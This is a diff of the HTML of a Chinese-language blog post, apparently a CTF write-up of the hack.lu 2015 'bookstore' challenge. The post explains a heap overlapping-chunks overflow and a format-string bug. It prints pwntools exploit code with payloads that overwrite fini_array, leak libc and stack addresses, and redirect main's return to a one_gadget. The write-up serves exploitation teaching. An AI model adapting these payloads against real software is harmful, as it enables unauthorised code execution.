@@ -1,34 +1,10 @@
-<!doctype html><html lang=zh-cn>
-<head>
-<meta charset=utf-8>
-<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
-<title>How2heap--overlapping_chunks Hack.lu2015--bookstore - hhdx's blog</title>
-<meta name=renderer content="webkit">
-<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
-<meta http-equiv=cache-control content="no-transform">
-<meta http-equiv=cache-control content="no-siteapp">
-<meta name=theme-color content="#f8f5ec">
-<meta name=msapplication-navbutton-color content="#f8f5ec">
-<meta name=apple-mobile-web-app-capable content="yes">
-<meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec">
-<meta name=author content="hhdx"><meta name=description content="overlapping chunks 溢出对unsortedbin中的chunk-&amp;gt;size进行修改，造成堆块重叠。
-hack.lu2015 bookstore 1 2 3 4 5  Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000)   程序是一个订书系统，在main函数开始处，连续分配3个0x80的空间，一个存储订单1——order1，一个存储订单2——order2，一个存储提示信息——info。有以下功能菜单
-1 2 3 4 5  1: Edit order 1 2: Edit order 2 3: Delete order 1 4: Delete order 2 5: Submit   Edit order 1/2：order1/order2使用fgetc读取字符串，读到\n终止，所以这里存在溢出
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>How2heap--overlapping_chunks Hack.lu2015--bookstore - hhdx's blog</title><meta name=renderer content="webkit"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><meta name=theme-color content="#f8f5ec"><meta name=msapplication-navbutton-color content="#f8f5ec"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec"><meta name=author content="hhdx"><meta name=description content="overlapping chunks 溢出对unsortedbin中的chunk-&amp;gt;size进行修改，造成堆块重叠。
+hack.lu2015 bookstore 1 2 3 4 5 Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) 程序是一个订书系统，在main函数开始处，连续分配3个0x80的空间，一个存储订单1——order1，一个存储订单2——order2，一个存储提示信息——info。有以下功能菜单
+1 2 3 4 5 1: Edit order 1 2: Edit order 2 3: Delete order 1 4: Delete order 2 5: Submit Edit order 1/2：order1/order2使用fgetc读取字符串，读到\n终止，所以这里存在溢出
 Delete order 1/2：free掉order1/order2。这里存在指针悬空
 Submit： 分配0x140的空间（称为orderlist）将order1和order2拼接。这里存在溢出
 程序末尾printf(info)存在可能的格式化字符串漏洞。
-overlapping chunks &amp;amp;&amp;amp; format string vulnerability"><meta name=keywords content="C language,CTF,system engineer">
-<meta name=generator content="Hugo 0.88.1 with theme even">
-<link rel=canonical href=https://hhdx.xyz/post/how2heap-overlapping-chunks-hack-lu2015-bookstore/>
-<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png>
-<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
-<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png>
-<link rel=manifest href=/manifest.json>
-<link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5>
-<link href=/sass/main.min.0d3b8ec8ed7df891edf32830bfdc6af5976dc6b9ffeb7cd1d0cdd312bcf8e23e.css rel=stylesheet>
-<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous>
-<meta property="og:title" content="How2heap--overlapping_chunks Hack.lu2015--bookstore">
-<meta property="og:description" content="overlapping chunks
+overlapping chunks &amp;amp;&amp;amp; format string vulnerability"><meta name=keywords content="C language,CTF,system engineer"><meta name=generator content="Hugo 0.116.1 with theme even"><link rel=canonical href=https://hhdx.xyz/post/how2heap-overlapping-chunks-hack-lu2015-bookstore/><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/manifest.json><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link href=/sass/main.min.bda6190ea12800aa36851bdb7b5cb5af46ca988222781d28b20a96aa4c1f6e68.css rel=stylesheet><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous><meta property="og:title" content="How2heap--overlapping_chunks Hack.lu2015--bookstore"><meta property="og:description" content="overlapping chunks
 溢出对unsortedbin中的chunk->size进行修改，造成堆块重叠。
 hack.lu2015 bookstore
 
@@ -68,13 +44,7 @@ Edit order 1/2：order1/order2使用fgetc读取字符串，读到\n终止，所�
 Delete order 1/2：free掉order1/order2。这里存在指针悬空
 Submit： 分配0x140的空间（称为orderlist）将order1和order2拼接。这里存在溢出
 程序末尾printf(info)存在可能的格式化字符串漏洞。
-overlapping chunks && format string vulnerability">
-<meta property="og:type" content="article">
-<meta property="og:url" content="https://hhdx.xyz/post/how2heap-overlapping-chunks-hack-lu2015-bookstore/"><meta property="article:section" content="post">
-<meta property="article:published_time" content="2020-07-05T18:45:39+00:00">
-<meta property="article:modified_time" content="2020-07-05T18:45:39+00:00">
-<meta itemprop=name content="How2heap--overlapping_chunks Hack.lu2015--bookstore">
-<meta itemprop=description content="overlapping chunks
+overlapping chunks && format string vulnerability"><meta property="og:type" content="article"><meta property="og:url" content="https://hhdx.xyz/post/how2heap-overlapping-chunks-hack-lu2015-bookstore/"><meta property="article:section" content="post"><meta property="article:published_time" content="2020-07-05T18:45:39+00:00"><meta property="article:modified_time" content="2020-07-05T18:45:39+00:00"><meta itemprop=name content="How2heap--overlapping_chunks Hack.lu2015--bookstore"><meta itemprop=description content="overlapping chunks
 溢出对unsortedbin中的chunk->size进行修改，造成堆块重叠。
 hack.lu2015 bookstore
 
@@ -114,12 +84,7 @@ Edit order 1/2：order1/order2使用fgetc读取字符串，读到\n终止，所�
 Delete order 1/2：free掉order1/order2。这里存在指针悬空
 Submit： 分配0x140的空间（称为orderlist）将order1和order2拼接。这里存在溢出
 程序末尾printf(info)存在可能的格式化字符串漏洞。
-overlapping chunks && format string vulnerability"><meta itemprop=datePublished content="2020-07-05T18:45:39+00:00">
-<meta itemprop=dateModified content="2020-07-05T18:45:39+00:00">
-<meta itemprop=wordCount content="2272">
-<meta itemprop=keywords content="how2heap,CTF,"><meta name=twitter:card content="summary">
-<meta name=twitter:title content="How2heap--overlapping_chunks Hack.lu2015--bookstore">
-<meta name=twitter:description content="overlapping chunks
+overlapping chunks && format string vulnerability"><meta itemprop=datePublished content="2020-07-05T18:45:39+00:00"><meta itemprop=dateModified content="2020-07-05T18:45:39+00:00"><meta itemprop=wordCount content="2272"><meta itemprop=keywords content="how2heap,CTF,"><meta name=twitter:card content="summary"><meta name=twitter:title content="How2heap--overlapping_chunks Hack.lu2015--bookstore"><meta name=twitter:description content="overlapping chunks
 溢出对unsortedbin中的chunk->size进行修改，造成堆块重叠。
 hack.lu2015 bookstore
 
@@ -160,138 +125,29 @@ Delete order 1/2：free掉order1/order2。这里存在指针悬空
 Submit： 分配0x140的空间（称为orderlist）将order1和order2拼接。这里存在溢出
 程序末尾printf(info)存在可能的格式化字符串漏洞。
 overlapping chunks && format string vulnerability"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
-<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]-->
-</head>
-<body>
-<div id=mobile-navbar class=mobile-navbar>
-<div class=mobile-header-logo>
-<a href=/ class=logo>hhdx's blog</a>
-</div>
-<div class=mobile-navbar-icon>
+<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=/ class=logo>hhdx's blog</a></div><div class=mobile-navbar-icon><span></span>
 <span></span>
-<span></span>
-<span></span>
-</div>
-</div>
-<nav id=mobile-menu class="mobile-menu slideout-menu">
-<ul class=mobile-menu-list>
-<a href=/>
-<li class=mobile-menu-item>Home</li>
-</a><a href=/post/>
-<li class=mobile-menu-item>Archives</li>
-</a><a href=/tags/>
-<li class=mobile-menu-item>Tags</li>
-</a><a href=/links/>
-<li class=mobile-menu-item>Links</li>
-</a><a href=/about/>
-<li class=mobile-menu-item>About</li>
-</a>
-</ul>
-</nav>
-<div class=container id=mobile-panel>
-<header id=header class=header>
-<div class=logo-wrapper>
-<a href=/ class=logo>hhdx's blog</a>
-</div>
-<nav class=site-navbar>
-<ul id=menu class=menu>
-<li class=menu-item>
-<a class=menu-item-link href=/>Home</a>
-</li><li class=menu-item>
-<a class=menu-item-link href=/post/>Archives</a>
-</li><li class=menu-item>
-<a class=menu-item-link href=/tags/>Tags</a>
-</li><li class=menu-item>
-<a class=menu-item-link href=/links/>Links</a>
-</li><li class=menu-item>
-<a class=menu-item-link href=/about/>About</a>
-</li>
-</ul>
-</nav>
-</header>
-<main id=main class=main>
-<div class=content-wrapper>
-<div id=content class=content>
-<article class=post>
-<header class=post-header>
-<h1 class=post-title>How2heap--overlapping_chunks Hack.lu2015--bookstore</h1>
-<div class=post-meta>
-<span class=post-time> 2020-07-05 </span>
-</div>
-</header>
-<div class=post-toc id=post-toc>
-<h2 class=post-toc-title>文章目录</h2>
-<div class="post-toc-content always-active">
-<nav id=TableOfContents>
-<ul>
-<li>
-<ul>
-<li><a href=#overlapping-chunks>overlapping chunks</a></li>
-<li><a href=#hacklu2015-bookstore>hack.lu2015 bookstore</a>
-<ul>
-<li><a href=#overlapping-chunks--format-string-vulnerability>overlapping chunks && format string vulnerability</a></li>
-<li><a href=#关于fini_array>关于fini_array</a></li>
-</ul>
-</li>
-<li><a href=#exploit>exploit</a></li>
-<li><a href=#reference>Reference</a></li>
-</ul>
-</li>
-</ul>
-</nav>
-</div>
-</div>
-<div class=post-content>
-<h2 id=overlapping-chunks>overlapping chunks</h2>
-<p>溢出对unsortedbin中的<code>chunk->size</code>进行修改，造成堆块重叠。</p>
-<h2 id=hacklu2015-bookstore>hack.lu2015 bookstore</h2>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+<span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=/><li class=mobile-menu-item>Home</li></a><a href=/post/><li class=mobile-menu-item>Archives</li></a><a href=/tags/><li class=mobile-menu-item>Tags</li></a><a href=/links/><li class=mobile-menu-item>Links</li></a><a href=/about/><li class=mobile-menu-item>About</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=/ class=logo>hhdx's blog</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=/>Home</a></li><li class=menu-item><a class=menu-item-link href=/post/>Archives</a></li><li class=menu-item><a class=menu-item-link href=/tags/>Tags</a></li><li class=menu-item><a class=menu-item-link href=/links/>Links</a></li><li class=menu-item><a class=menu-item-link href=/about/>About</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>How2heap--overlapping_chunks Hack.lu2015--bookstore</h1><div class=post-meta><span class=post-time>2020-07-05</span></div></header><div class=post-toc id=post-toc><h2 class=post-toc-title>文章目录</h2><div class="post-toc-content always-active"><nav id=TableOfContents><ul><li><ul><li><a href=#overlapping-chunks>overlapping chunks</a></li><li><a href=#hacklu2015-bookstore>hack.lu2015 bookstore</a><ul><li><a href=#overlapping-chunks--format-string-vulnerability>overlapping chunks && format string vulnerability</a></li><li><a href=#关于fini_array>关于fini_array</a></li></ul></li><li><a href=#exploit>exploit</a></li><li><a href=#reference>Reference</a></li></ul></li></ul></nav></div></div><div class=post-content><h2 id=overlapping-chunks>overlapping chunks</h2><p>溢出对unsortedbin中的<code>chunk->size</code>进行修改，造成堆块重叠。</p><h2 id=hacklu2015-bookstore>hack.lu2015 bookstore</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
 </span><span class=lnt>5
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>Arch:     amd64-64-little
-RELRO:    No RELRO
-Stack:    Canary found
-NX:       NX enabled
-PIE:      No PIE (0x3ff000)
-</code></pre></td></tr></table>
-</div>
-</div><p>程序是一个订书系统，在main函数开始处，连续分配3个0x80的空间，一个存储订单1——order1，一个存储订单2——order2，一个存储提示信息——info。有以下功能菜单</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Arch:     amd64-64-little
+</span></span><span class=line><span class=cl>RELRO:    No RELRO
+</span></span><span class=line><span class=cl>Stack:    Canary found
+</span></span><span class=line><span class=cl>NX:       NX enabled
+</span></span><span class=line><span class=cl>PIE:      No PIE (0x3ff000)
+</span></span></code></pre></td></tr></table></div></div><p>程序是一个订书系统，在main函数开始处，连续分配3个0x80的空间，一个存储订单1——order1，一个存储订单2——order2，一个存储提示信息——info。有以下功能菜单</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
 </span><span class=lnt>5
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>1: Edit order 1
-2: Edit order 2
-3: Delete order 1
-4: Delete order 2
-5: Submit
-</code></pre></td></tr></table>
-</div>
-</div><p>Edit order 1/2：order1/order2使用fgetc读取字符串，读到<code>\n</code>终止，所以这里存在溢出</p>
-<p>Delete order 1/2：free掉order1/order2。这里存在指针悬空</p>
-<p>Submit： 分配0x140的空间（称为orderlist）将order1和order2拼接。这里存在溢出</p>
-<p>程序末尾<code>printf(info)</code>存在可能的格式化字符串漏洞。</p>
-<h3 id=overlapping-chunks--format-string-vulnerability>overlapping chunks && format string vulnerability</h3>
-<p>总体思路：释放order2，溢出order1修改<code>order2chunk->size = 0x151</code>。并在order1上布置format string，以泄露libc和stack addr，和修改fini_array为start的地址。第二次format string修改main函数返回地址为one_gadget。</p>
-<p>fini_array存储main函数结束后将要执行的函数地址，一般修改为main函数来达到再运行一次的目的。这里我修改为start也可以达到此效果，原本想达到main函数循环执行的效果，可是没有如我的心愿。。。</p>
-<h4 id=phase-1>phase 1</h4>
-<p>溢出修改unsortedbin中的order2的大小为0x151后，再分配0x140的orderlist，将会出现下图的情况。要想办法将format string精准控制在info开始处。</p>
-<p>submit函数中，连接order1后，<code>orderlist1 = "Order 1: " + XXXXXXXX</code>；order2指针悬空，和现在的orderlist指向的地址相同，所以连接order2将出现 <code>orderlist = "Order 1: " + XXXXXX + "\nOrder 2: " + orderlist1</code>。其中长度为9的字符串<code>Order 1: </code>出现了两次，长度为10的字符串<code>\nOrder 2: </code>出现了一次，故该函数额外向orderlist中填充了28个字节。</p>
-<p><img src=https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200705205842961.png alt=image-20200705205842961></p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1: Edit order 1
+</span></span><span class=line><span class=cl>2: Edit order 2
+</span></span><span class=line><span class=cl>3: Delete order 1
+</span></span><span class=line><span class=cl>4: Delete order 2
+</span></span><span class=line><span class=cl>5: Submit
+</span></span></code></pre></td></tr></table></div></div><p>Edit order 1/2：order1/order2使用fgetc读取字符串，读到<code>\n</code>终止，所以这里存在溢出</p><p>Delete order 1/2：free掉order1/order2。这里存在指针悬空</p><p>Submit： 分配0x140的空间（称为orderlist）将order1和order2拼接。这里存在溢出</p><p>程序末尾<code>printf(info)</code>存在可能的格式化字符串漏洞。</p><h3 id=overlapping-chunks--format-string-vulnerability>overlapping chunks && format string vulnerability</h3><p>总体思路：释放order2，溢出order1修改<code>order2chunk->size = 0x151</code>。并在order1上布置format string，以泄露libc和stack addr，和修改fini_array为start的地址。第二次format string修改main函数返回地址为one_gadget。</p><p>fini_array存储main函数结束后将要执行的函数地址，一般修改为main函数来达到再运行一次的目的。这里我修改为start也可以达到此效果，原本想达到main函数循环执行的效果，可是没有如我的心愿。。。</p><h4 id=phase-1>phase 1</h4><p>溢出修改unsortedbin中的order2的大小为0x151后，再分配0x140的orderlist，将会出现下图的情况。要想办法将format string精准控制在info开始处。</p><p>submit函数中，连接order1后，<code>orderlist1 = "Order 1: " + XXXXXXXX</code>；order2指针悬空，和现在的orderlist指向的地址相同，所以连接order2将出现 <code>orderlist = "Order 1: " + XXXXXX + "\nOrder 2: " + orderlist1</code>。其中长度为9的字符串<code>Order 1: </code>出现了两次，长度为10的字符串<code>\nOrder 2: </code>出现了一次，故该函数额外向orderlist中填充了28个字节。</p><p><img src=https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200705205842961.png alt=image-20200705205842961></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
@@ -300,30 +156,16 @@ PIE:      No PIE (0x3ff000)
 </span><span class=lnt>7
 </span><span class=lnt>8
 </span><span class=lnt>9
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=c1># phase 1</span>
-<span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
-
-<span class=c1># format string: overwrite fini_arrary with start, leak libc and stack</span>
-<span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=si>%1920x</span><span class=s2>%13$hn...%14$s,,,%28$llx&#34;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x90</span><span class=o>-</span><span class=mi>28</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x151</span><span class=p>)</span>
-<span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
-<span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
-<span class=c1># gdb.attach(io, &#34;b *0x400B09&#34;)</span>
-<span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;5&#34;</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span><span class=o>*</span><span class=mi>7</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fini_array</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>puts_got</span><span class=p>))</span>
-</code></pre></td></tr></table>
-</div>
-</div><p><code>%1920x%13$hn</code>，使用start地址0x400780，双字节覆盖fini_array，<code>13$</code>取第13个参数，<code>hn</code>控制写入双字节。</p>
-<p><code>%14$s</code>，打印puts_got。</p>
-<p><code>%28$llx</code>，打印stack地址。多次调试可以发现，main函数<code>rbp-0x10</code>处，存在一个与栈地址固定偏移0xf0的栈地址，应该为此前函数遗留。</p>
-<p>利用fgets将这些参数传到栈上。</p>
-<p><img src=https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200705212508537.png alt=image-20200705212508537></p>
-<h4 id=phase-2>phase 2</h4>
-<p>调试到第二轮次，计算此前泄露的栈地址与此次main函数返回地址偏移。</p>
-<p>将one_gadget地址的低四字节，写到返回地址处，一次一个字节。因为双字节有偶发性printf崩溃，应该是打印长度过长了。(我这里使用的自编译的glibc2.26 without tcache)</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># phase 1</span>
+</span></span><span class=line><span class=cl><span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># format string: overwrite fini_arrary with start, leak libc and stack</span>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=si>%1920x</span><span class=s2>%13$hn...%14$s,,,%28$llx&#34;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x90</span><span class=o>-</span><span class=mi>28</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x151</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1># gdb.attach(io, &#34;b *0x400B09&#34;)</span>
+</span></span><span class=line><span class=cl><span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;5&#34;</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span><span class=o>*</span><span class=mi>7</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fini_array</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>puts_got</span><span class=p>))</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>%1920x%13$hn</code>，使用start地址0x400780，双字节覆盖fini_array，<code>13$</code>取第13个参数，<code>hn</code>控制写入双字节。</p><p><code>%14$s</code>，打印puts_got。</p><p><code>%28$llx</code>，打印stack地址。多次调试可以发现，main函数<code>rbp-0x10</code>处，存在一个与栈地址固定偏移0xf0的栈地址，应该为此前函数遗留。</p><p>利用fgets将这些参数传到栈上。</p><p><img src=https://raw.githubusercontent.com/clxsh/pics/master/img/image-20200705212508537.png alt=image-20200705212508537></p><h4 id=phase-2>phase 2</h4><p>调试到第二轮次，计算此前泄露的栈地址与此次main函数返回地址偏移。</p><p>将one_gadget地址的低四字节，写到返回地址处，一次一个字节。因为双字节有偶发性printf崩溃，应该是打印长度过长了。(我这里使用的自编译的glibc2.26 without tcache)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -343,36 +185,27 @@ PIE:      No PIE (0x3ff000)
 </span><span class=lnt>18
 </span><span class=lnt>19
 </span><span class=lnt>20
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=n>one_gadget</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x40d82</span>
-<span class=n>log</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=s2>&#34;one gadget: 0x</span><span class=si>%x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>one_gadget</span><span class=p>)</span>
-<span class=n>p1</span> <span class=o>=</span> <span class=n>one_gadget</span>       <span class=o>&amp;</span> <span class=mh>0xff</span>
-<span class=n>p2</span> <span class=o>=</span> <span class=p>(</span><span class=n>one_gadget</span><span class=o>&gt;&gt;</span><span class=mi>8</span><span class=p>)</span>  <span class=o>&amp;</span> <span class=mh>0xff</span>
-<span class=n>p3</span> <span class=o>=</span> <span class=p>(</span><span class=n>one_gadget</span><span class=o>&gt;&gt;</span><span class=mi>16</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
-<span class=n>p4</span> <span class=o>=</span> <span class=p>(</span><span class=n>one_gadget</span><span class=o>&gt;&gt;</span><span class=mi>24</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
-
-<span class=n>part1</span> <span class=o>=</span> <span class=n>p1</span>
-<span class=n>part2</span> <span class=o>=</span> <span class=n>p2</span><span class=o>-</span><span class=n>p1</span> <span class=k>if</span> <span class=n>p2</span> <span class=o>&gt;</span> <span class=n>p1</span> <span class=k>else</span> <span class=mi>256</span><span class=o>-</span><span class=n>p1</span><span class=o>+</span><span class=n>p2</span>
-<span class=n>part3</span> <span class=o>=</span> <span class=n>p3</span><span class=o>-</span><span class=n>p2</span> <span class=k>if</span> <span class=n>p3</span> <span class=o>&gt;</span> <span class=n>p2</span> <span class=k>else</span> <span class=mi>256</span><span class=o>-</span><span class=n>p2</span><span class=o>+</span><span class=n>p3</span>
-<span class=n>part4</span> <span class=o>=</span> <span class=n>p4</span><span class=o>-</span><span class=n>p3</span> <span class=k>if</span> <span class=n>p4</span> <span class=o>&gt;</span> <span class=n>p3</span> <span class=k>else</span> <span class=mi>256</span><span class=o>-</span><span class=n>p3</span><span class=o>+</span><span class=n>p4</span>
-
-<span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;4&#34;</span><span class=p>)</span>
-<span class=n>payload</span>  <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;%&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>part1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;x%13$hhn%&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>part2</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;x%14$hhn&#34;</span>
-<span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;%&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>part3</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;x%15$hhn%&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>part4</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;x%16$hhn&#34;</span>
-<span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x90</span><span class=o>-</span><span class=mi>28</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x151</span><span class=p>)</span>
-<span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
-<span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
-<span class=c1># gdb.attach(io, &#34;b *0x400B09&#34;)</span>
-<span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;5&#34;</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span><span class=o>*</span><span class=mi>7</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_addr</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_addr</span><span class=o>+</span><span class=mi>2</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_addr</span><span class=o>+</span><span class=mi>3</span><span class=p>))</span>
-</code></pre></td></tr></table>
-</div>
-</div><p><a href=https://github.com/clxsh/ctf_wps/blob/master/others/hack.lu2015%20bookstore/exp.py>exploit</a></p>
